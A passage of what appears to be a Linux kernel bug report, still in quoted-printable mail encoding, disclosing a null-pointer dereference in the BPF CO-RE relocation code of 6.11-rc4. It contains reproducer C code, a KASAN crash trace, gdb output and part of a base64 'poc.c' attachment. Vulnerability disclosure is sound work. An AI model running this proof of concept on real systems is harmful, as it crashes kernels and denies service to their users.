        syscall(__NR_bpf, /*cmd=3D*/5ul, /*arg=3D*/0x20000480ul, /*size=3D*=
/0x90ul);
        break;
    case 2:
*(uint32_t*)0x20000440 =3D -1;
*(uint64_t*)0x20000448 =3D 0x200003c0;
*(uint32_t*)0x200003c0 =3D 0;
*(uint64_t*)0x20000450 =3D 0;
*(uint64_t*)0x20000458 =3D 0;
        syscall(__NR_bpf, /*cmd=3D*/2ul, /*arg=3D*/0x20000440ul, /*size=3D*=
/0x20ul);
        break;
    }

}
int main(void)
{
        syscall(__NR_mmap, /*addr=3D*/0x1ffff000ul, /*len=3D*/0x1000ul,
/*prot=3D*/0ul, /*flags=3DMAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE*/0x32ul,
/*fd=3D*/-1, /*offset=3D*/0ul);
    syscall(__NR_mmap, /*addr=3D*/0x20000000ul, /*len=3D*/0x1000000ul,
/*prot=3DPROT_WRITE|PROT_READ|PROT_EXEC*/7ul,
/*flags=3DMAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE*/0x32ul, /*fd=3D*/-1,
/*offset=3D*/0ul);
    syscall(__NR_mmap, /*addr=3D*/0x21000000ul, /*len=3D*/0x1000ul,
/*prot=3D*/0ul, /*flags=3DMAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE*/0x32ul,
/*fd=3D*/-1, /*offset=3D*/0ul);
    const char* reason;
    (void)reason;
            loop();
    return 0;
}
```
And here is the crash information
```
[   89.482115] Oops: general protection fault, probably for
non-canonical address 0xdffffc0000000000: 0000 [#1] PREEMPT SMP KASAN
PTI
[   89.482639] KASAN: null-ptr-deref in range
[0x0000000000000000-0x0000000000000007]
[   89.482979] CPU: 1 UID: 0 PID: 214 Comm: test Not tainted 6.11.0-rc4 #1
[   89.483276] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996),
BIOS 1.15.0-1 04/01/2014
[   89.483632] RIP: 0010:bpf_core_calc_relo_insn+0x11e/0x1e90
[   89.483885] Code: 48 8b 85 28 fd ff ff 4c 89 ef 44 8b 70 04 44 89
f6 e8 96 a5 f8 ff 48 89 c2 49 89 c4 48 b8 00 00 00 00 00 fc ff df 48
c1 ea 03 <0f> b6 14c
[   89.484686] RSP: 0018:ffff888108f373d0 EFLAGS: 00010246
[   89.484924] RAX: dffffc0000000000 RBX: dffffc0000000000 RCX: ffffffff816=
c8b8b
[   89.485247] RDX: 0000000000000000 RSI: ffffffff816c8bea RDI: 00000000000=
00004
[   89.485563] RBP: ffff888108f376c0 R08: ffff888108f37778 R09: ffff8881099=
1c000
[   89.485880] R10: 0000000000000004 R11: ffff888103ab1c90 R12: 00000000000=
00000
[   89.486197] R13: ffff888103ddfe00 R14: 0000000000000004 R15: ffff8881099=
1c000
[   89.486514] FS:  00007f94a2d15640(0000) GS:ffff8881f7100000(0000)
knlGS:0000000000000000
[   89.486874] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   89.487128] CR2: 0000000020000480 CR3: 0000000106058000 CR4: 00000000003=
006f0
[   89.487439] Call Trace:
[   89.487553]  <TASK>
[   89.487654]  ? show_regs+0x93/0xa0
[   89.487815]  ? die_addr+0x50/0xd0
[   89.487972]  ? exc_general_protection+0x19f/0x320
[   89.488185]  ? asm_exc_general_protection+0x26/0x30
[   89.488405]  ? btf_type_by_id+0xeb/0x1a0
[   89.488584]  ? btf_type_by_id+0x14a/0x1a0
[   89.488766]  ? bpf_core_calc_relo_insn+0x11e/0x1e90
[   89.488989]  ? __printk_safe_exit+0x9/0x20
[   89.489175]  ? stack_depot_save_flags+0x616/0x7c0
[   89.489392]  ? bpf_prog_load+0x151c/0x2450
[   89.489594]  ? kasan_save_stack+0x34/0x50
[   89.489792]  ? kasan_save_stack+0x24/0x50
[   89.489987]  ? __pfx_bpf_core_calc_relo_insn+0x10/0x10
[   89.490231]  ? bpf_check+0x6744/0xba00
[   89.490415]  ? bpf_prog_load+0x151c/0x2450
[   89.490612]  ? __sys_bpf+0x12be/0x5290
[   89.490795]  ? __x64_sys_bpf+0x78/0xc0
[   89.490979]  ? do_syscall_64+0xa6/0x1a0
[   89.491167]  ? entry_SYSCALL_64_after_hwframe+0x77/0x7f
[   89.491417]  ? __pfx_vsnprintf+0x10/0x10
[   89.491611]  ? sort_r+0x45/0x5f0
[   89.491774]  ? _copy_to_user+0x77/0x90
[   89.491954]  ? bpf_verifier_vlog+0x25b/0x690
[   89.492150]  ? __pfx_sort+0x10/0x10
[   89.492314]  ? verbose+0xde/0x170
[   89.492470]  ? kasan_unpoison+0x27/0x60
[   89.492648]  ? __kasan_slab_alloc+0x30/0x70
[   89.492837]  ? __kmalloc_cache_noprof+0xf0/0x270
[   89.493050]  bpf_core_apply+0x48b/0xaf0
[   89.493228]  ? btf_name_by_offset+0x13a/0x180
[   89.493431]  ? __pfx_bpf_core_apply+0x10/0x10
[   89.493631]  ? __pfx_check_btf_line+0x10/0x10
[   89.493830]  ? bpf_check_uarg_tail_zero+0x142/0x1c0
[   89.494051]  ? __pfx_bpf_check_uarg_tail_zero+0x10/0x10
[   89.494286]  bpf_check+0x6744/0xba00
[   89.494458]  ? kasan_save_stack+0x34/0x50
[   89.494653]  ? kasan_save_stack+0x24/0x50
[   89.494848]  ? kasan_save_track+0x14/0x30
[   89.495039]  ? __kasan_kmalloc+0x7f/0x90
[   89.495232]  ? __pfx_bpf_check+0x10/0x10
[   89.495426]  ? pcpu_chunk_relocate+0x145/0x1c0
[   89.495640]  ? mutex_unlock+0x7e/0xd0
[   89.495820]  ? kasan_unpoison+0x27/0x60
[   89.496008]  ? __kasan_slab_alloc+0x30/0x70
[   89.496208]  ? __kmalloc_cache_noprof+0xf0/0x270
[   89.496430]  ? kasan_save_track+0x14/0x30
[   89.496622]  ? __kasan_kmalloc+0x7f/0x90
[   89.496810]  ? selinux_bpf_prog_load+0x15b/0x1c0
[   89.497024]  bpf_prog_load+0x151c/0x2450
[   89.497206]  ? __pfx_bpf_prog_load+0x10/0x10
[   89.497405]  ? avc_has_perm+0x175/0x2f0
[   89.497585]  ? __pte_offset_map+0x12f/0x1f0
[   89.497774]  ? bpf_check_uarg_tail_zero+0x142/0x1c0
[   89.497994]  ? selinux_bpf+0xdd/0x120
[   89.498163]  ? security_bpf+0x8d/0xb0
[   89.498333]  __sys_bpf+0x12be/0x5290
[   89.498500]  ? folio_add_lru+0x58/0x80
[   89.498675]  ? __pfx___sys_bpf+0x10/0x10
[   89.498855]  ? __pfx_down_read_trylock+0x10/0x10
[   89.499069]  ? __pfx___handle_mm_fault+0x10/0x10
[   89.499283]  ? do_user_addr_fault+0x595/0x1220
[   89.499524]  __x64_sys_bpf+0x78/0xc0
[   89.499738]  ? exc_page_fault+0xae/0x180
[   89.499928]  do_syscall_64+0xa6/0x1a0
[   89.500109]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[   89.500361] RIP: 0033:0x44ceed
[   89.500512] Code: c3 e8 d7 1e 00 00 0f 1f 80 00 00 00 00 f3 0f 1e
fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24
08 0f 05 <48> 3d 018
[   89.501348] RSP: 002b:00007f94a2d15178 EFLAGS: 00000287 ORIG_RAX:
0000000000000141
[   89.501695] RAX: ffffffffffffffda RBX: 00007f94a2d15640 RCX: 00000000004=
4ceed
[   89.502013] RDX: 0000000000000090 RSI: 0000000020000480 RDI: 00000000000=
00005
[   89.502323] RBP: 00007f94a2d151a0 R08: 0000000000000000 R09: 00000000000=
00000
[   89.502635] R10: 0000000000000000 R11: 0000000000000287 R12: 00007f94a2d=
15640
[   89.502949] R13: 0000000000000000 R14: 00000000004160d0 R15: 00007f94a2c=
f5000
[   89.503269]  </TASK>
[   89.503376] Modules linked in:
[   89.503586] ---[ end trace 0000000000000000 ]---
[   89.503793] RIP: 0010:bpf_core_calc_relo_insn+0x11e/0x1e90
[   89.504045] Code: 48 8b 85 28 fd ff ff 4c 89 ef 44 8b 70 04 44 89
f6 e8 96 a5 f8 ff 48 89 c2 49 89 c4 48 b8 00 00 00 00 00 fc ff df 48
c1 ea 03 <0f> b6 14c
[   89.504860] RSP: 0018:ffff888108f373d0 EFLAGS: 00010246
[   89.505112] RAX: dffffc0000000000 RBX: dffffc0000000000 RCX: ffffffff816=
c8b8b
[   89.505441] RDX: 0000000000000000 RSI: ffffffff816c8bea RDI: 00000000000=
00004
[   89.505768] RBP: ffff888108f376c0 R08: ffff888108f37778 R09: ffff8881099=
1c000
[   89.506099] R10: 0000000000000004 R11: ffff888103ab1c90 R12: 00000000000=
00000
[   89.506427] R13: ffff888103ddfe00 R14: 0000000000000004 R15: ffff8881099=
1c000
[   89.506754] FS:  00007f94a2d15640(0000) GS:ffff8881f7100000(0000)
knlGS:0000000000000000
[   89.507129] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   89.507398] CR2: 0000000020000480 CR3: 0000000106058000 CR4: 00000000003=
006f0
```
I use gdb debug it,and found that the lack of a NULL check before
using local_type has led to a null pointer dereference vulnerability.
```
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
[
REGISTERS / show-flags off / show-compact-regs off
]=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80
 RAX  0xdffffc0000000000
 RBX  0xdffffc0000000000
 RCX  0xffffffff816c8b8b (btf_type_by_id+235) =E2=97=82=E2=80=94 0x404be855=
76e53944
 RDX  0x0
 RDI  0x4
 RSI  0xffffffff816c8bea (btf_type_by_id+330) =E2=97=82=E2=80=94 0xe0894c5d=
5be43145
 R8   0xffff88811669f778 =E2=97=82=E2=80=94 0x0
 R9   0xffff888115f48000 =E2=97=82=E2=80=94 0x0
 R10  0x4
 R11  0xffff888104562080 =E2=97=82=E2=80=94 0x0
 R12  0x0
 R13  0xffff8881135b7000 =E2=80=94=E2=96=B8 0xffff8881166280c2 =E2=97=82=E2=
=80=94 0x0
 R14  0x4
 R15  0xffff888115f48000 =E2=97=82=E2=80=94 0x0
 RBP  0xffff88811669f6c0 =E2=80=94=E2=96=B8 0xffff88811669f798 =E2=80=94=E2=
=96=B8 0xffffffff8160fcb0
(check_btf_line) =E2=97=82=E2=80=94 0x56415741e5894855
 RSP  0xffff88811669f3d0 =E2=97=82=E2=80=94 0x1ffff11022cd3e92
*RIP  0xffffffff8173e51e (bpf_core_calc_relo_insn+286) =E2=97=82=E2=80=94 0=
x83e0894c0214b60f
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80[
DISASM / x86-64 / set emulate on
]=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80
   0xffffffff8173e505 <bpf_core_calc_relo_insn+261>    call
btf_type_by_id            <btf_type_by_id>

   0xffffffff8173e50a <bpf_core_calc_relo_insn+266>    mov    rdx, rax
   0xffffffff8173e50d <bpf_core_calc_relo_insn+269>    mov    r12, rax
   0xffffffff8173e510 <bpf_core_calc_relo_insn+272>    movabs rax,
0xdffffc0000000000
   0xffffffff8173e51a <bpf_core_calc_relo_insn+282>    shr    rdx, 3
                     <fixed_percpu_data+3>
 =E2=96=BA 0xffffffff8173e51e <bpf_core_calc_relo_insn+286>    movzx  edx,
byte ptr [rdx + rax]
   0xffffffff8173e522 <bpf_core_calc_relo_insn+290>    mov    rax, r12
   0xffffffff8173e525 <bpf_core_calc_relo_insn+293>    and    eax, 7
                     <fixed_percpu_data+7>
   0xffffffff8173e528 <bpf_core_calc_relo_insn+296>    add    eax, 3
                     <fixed_percpu_data+3>
   0xffffffff8173e52b <bpf_core_calc_relo_insn+299>    cmp    al, dl
   0xffffffff8173e52d <bpf_core_calc_relo_insn+301>    jl
bpf_core_calc_relo_insn+311            <bpf_core_calc_relo_insn+311>
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80[
SOURCE (CODE) ]=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80
In file: /home/ubuntu/fuzz/linux-6.11-rc4/tools/lib/bpf/relo_core.c:1300
   1295         char spec_buf[256];
   1296         int i, j, err;
   1297
   1298         local_id =3D relo->type_id;
   1299         local_type =3D btf_type_by_id(local_btf, local_id);
 =E2=96=BA 1300         local_name =3D btf__name_by_offset(local_btf,
local_type->name_off);
   1301         if (!local_name)
   1302                 return -EINVAL;
   1303
   1304         err =3D bpf_core_parse_spec(prog_name, local_btf, relo,
local_spec);
   1305         if (err) {
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80[
STACK ]=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80
```

--000000000000dda6d2062019f35f
Content-Type: text/plain; charset="US-ASCII"; name="poc.c"
Content-Disposition: attachment; filename="poc.c"
Content-Transfer-Encoding: base64
Content-ID: <f_m027pdx01>
X-Attachment-Id: f_m027pdx01

I2RlZmluZSBfR05VX1NPVVJDRSAKCiNpbmNsdWRlIDxlbmRpYW4uaD4KI2luY2x1ZGUgPGVycm5v
Lmg+CiNpbmNsdWRlIDxwdGhyZWFkLmg+CiNpbmNsdWRlIDxzdGRpbnQuaD4KI2luY2x1ZGUgPHN0
ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHN0cmluZy5oPgojaW5jbHVkZSA8
c3lzL3N5c2NhbGwuaD4KI2luY2x1ZGUgPHN5cy90eXBlcy5oPgojaW5jbHVkZSA8dGltZS5oPgoj
aW5jbHVkZSA8dW5pc3RkLmg+CgojaW5jbHVkZSA8bGludXgvZnV0ZXguaD4KCiNpZm5kZWYgX19O
Ul9icGYKI2RlZmluZSBfX05SX2JwZiAzMjEKI2VuZGlmCgpzdGF0aWMgdm9pZCBzbGVlcF9tcyh1
aW50NjRfdCBtcykKewoJdXNsZWVwKG1zICogMTAwMCk7Cn0KCnN0YXRpYyB1aW50NjRfdCBjdXJy
ZW50X3RpbWVfbXModm9pZCkKewoJc3RydWN0IHRpbWVzcGVjIHRzOwoJaWYgKGNsb2NrX2dldHRp
bWUoQ0xPQ0tfTU9OT1RPTklDLCAmdHMpKQoJZXhpdCgxKTsKCXJldHVybiAodWludDY0X3QpdHMu
dHZfc2VjICogMTAwMCArICh1aW50NjRfdCl0cy50dl9uc2VjIC8gMTAwMDAwMDsKfQoKc3RhdGlj
IHZvaWQgdGhyZWFkX3N0YXJ0KHZvaWQqICgqZm4pKHZvaWQqKSwgdm9pZCogYXJnKQp7CglwdGhy
ZWFkX3QgdGg7CglwdGhyZWFkX2F0dHJfdCBhdHRyOwoJcHRocmVhZF9hdHRyX2luaXQoJmF0dHIp
OwoJcHRocmVhZF9hdHRyX3NldHN0YWNrc2l6ZSgmYXR0ciwgMTI4IDw8IDEwKTsKCWludCBpID0g
MDsKCWZvciAoOyBpIDwgMTAwOyBpKyspIHsKCQlpZiAocHRocmVhZF9jcmVhdGUoJnRoLCAmYXR0
ciwgZm4sIGFyZykgPT0gMCkgewoJCQlwdGhyZWFkX2F0dHJfZGVzdHJveSgmYXR0cik7CgkJCXJl
dHVybjsKCQl9CgkJaWYgKGVycm5vID09IEVBR0FJTikgewoJCQl1c2xlZXAoNTApOwoJCQljb250
aW51ZTsKCQl9CgkJYnJlYWs7Cgl9CglleGl0KDEpOwp9CgojZGVmaW5lIEJJVE1BU0soYmZfb2Zm
LGJmX2xlbikgKCgoMXVsbCA8PCAoYmZfbGVuKSkgLSAxKSA8PCAoYmZfb2ZmKSkKI2RlZmluZSBT
VE9SRV9CWV9CSVRNQVNLKHR5cGUsaHRvYmUsYWRkcix2YWwsYmZfb2ZmLGJmX2xlbikgKih0eXBl
KikoYWRkcikgPSBodG9iZSgoaHRvYmUoKih0eXBlKikoYWRkcikpICYgfkJJVE1BU0soKGJmX29m
ZiksIChiZl9sZW4pKSkgfCAoKCh0eXBlKSh2YWwpIDw8IChiZl9vZmYpKSAmIEJJVE1BU0soKGJm
X29mZiksIChiZl9sZW4pKSkpCgp0eXBlZGVmIHN0cnVjdCB7CglpbnQgc3RhdGU7Cn0gZXZlbnRf
dDsKCnN0YXRpYyB2b2lkIGV2ZW50X2luaXQoZXZlbnRfdCogZXYpCnsKCWV2LT5zdGF0ZSA9IDA7
Cn0KCnN0YXRpYyB2b2lkIGV2ZW50X3Jlc2V0KGV2ZW50X3QqIGV2KQp7Cglldi0+c3RhdGUgPSAw
Owp9CgpzdGF0aWMgdm9pZCBldmVudF9zZXQoZXZlbnRfdCogZXYpCnsKCWlmIChldi0+c3RhdGUp
CglleGl0KDEpOwoJX19hdG9taWNfc3RvcmVfbigmZXYtPnN0YXRlLCAxLCBfX0FUT01JQ19SRUxF
QVNFKTsKCXN5c2NhbGwoU1lTX2Z1dGV4LCAmZXYtPnN0YXRlLCBGVVRFWF9XQUtFIHwgRlVURVhf
UFJJVkFURV9GTEFHLCAxMDAwMDAwKTsKfQoKc3RhdGljIHZvaWQgZXZlbnRfd2FpdChldmVudF90
KiBldikKewoJd2hpbGUgKCFfX2F0b21pY19sb2FkX24oJmV2LT5zdGF0ZSwgX19BVE9NSUNfQUNR
VUlSRSkpCgkJc3lzY2FsbChTWVNfZnV0ZXgsICZldi0+c3RhdGUsIEZVVEVYX1dBSVQgfCBGVVRF
WF9QUklWQVRFX0ZMQUcsIDAsIDApOwp9CgpzdGF0aWMgaW50IGV2ZW50X2lzc2V0KGV2ZW50X3Qq
IGV2KQp7CglyZXR1cm4gX19hdG9taWNfbG9hZF9uKCZldi0+c3RhdGUsIF9fQVRPTUlDX0FDUVVJ
UkUpOwp9CgpzdGF0aWMgaW50IGV2ZW50X3RpbWVkd2FpdChldmVudF90KiBldiwgdWludDY0X3Qg
dGltZW91dCkKewoJdWludDY0X3Qgc3RhcnQgPSBjdXJyZW50X3RpbWVfbXMoKTsKCXVpbnQ2NF90
IG5vdyA9IHN0YXJ0OwoJZm9yICg7OykgewoJCXVpbnQ2NF90IHJlbWFpbiA9IHRpbWVvdXQgLSAo
bm93IC0gc3RhcnQpOwoJCXN0cnVjdCB0aW1lc3BlYyB0czsKCQl0cy50dl9zZWMgPSByZW1haW4g
LyAxMDAwOwoJCXRzLnR2X25zZWMgPSAocmVtYWluICUgMTAwMCkgKiAxMDAwICogMTAwMDsKCQlz
eXNjYWxsKFNZU19mdXRleCwgJmV2LT5zdGF0ZSwgRlVURVhfV0FJVCB8IEZVVEVYX1BSSVZBVEVf
RkxBRywgMCwgJnRzKTsKCQlpZiAoX19hdG9taWNfbG9hZF9uKCZldi0+c3RhdGUsIF9fQVRPTUlD
X0FDUVVJUkUpKQoJCQlyZXR1cm4gMTsKCQlub3cgPSBjdXJyZW50X3RpbWVfbXMoKTsKCQlpZiAo
bm93IC0gc3RhcnQgPiB0aW1lb3V0KQoJCQlyZXR1cm4gMDsKCX0KfQoKc3RydWN0IHRocmVhZF90
IHsKCWludCBjcmVhdGVkLCBjYWxsOwoJZXZlbnRfdCByZWFkeSwgZG9uZTsKfTsKCnN0YXRpYyBz
dHJ1Y3QgdGhyZWFkX3QgdGhyZWFkc1sxNl07CnN0YXRpYyB2b2lkIGV4ZWN1dGVfY2FsbChpbnQg
Y2FsbCk7CnN0YXRpYyBpbnQgcnVubmluZzsKCnN0YXRpYyB2b2lkKiB0aHIodm9pZCogYXJnKQp7
CglzdHJ1Y3QgdGhyZWFkX3QqIHRoID0gKHN0cnVjdCB0aHJlYWRfdCopYXJnOwoJZm9yICg7Oykg
ewoJCWV2ZW50X3dhaXQoJnRoLT5yZWFkeSk7CgkJZXZlbnRfcmVzZXQoJnRoLT5yZWFkeSk7CgkJ
ZXhlY3V0ZV9jYWxsKHRoLT5jYWxsKTsKCQlfX2F0b21pY19mZXRjaF9zdWIoJnJ1bm5pbmcsIDEs
IF9fQVRPTUlDX1JFTEFYRUQpOwoJCWV2ZW50X3NldCgmdGgtPmRvbmUpOwoJfQoJcmV0dXJuIDA7
Cn0KCnN0YXRpYyB2b2lkIGxvb3Aodm9pZCkKewoJaWYgKHdyaXRlKDEsICJleGVjdXRpbmcgcHJv
Z3JhbVxuIiwgc2l6ZW9mKCJleGVjdXRpbmcgcHJvZ3JhbVxuIikgLSAxKSkgewoJfQoJaW50IGks
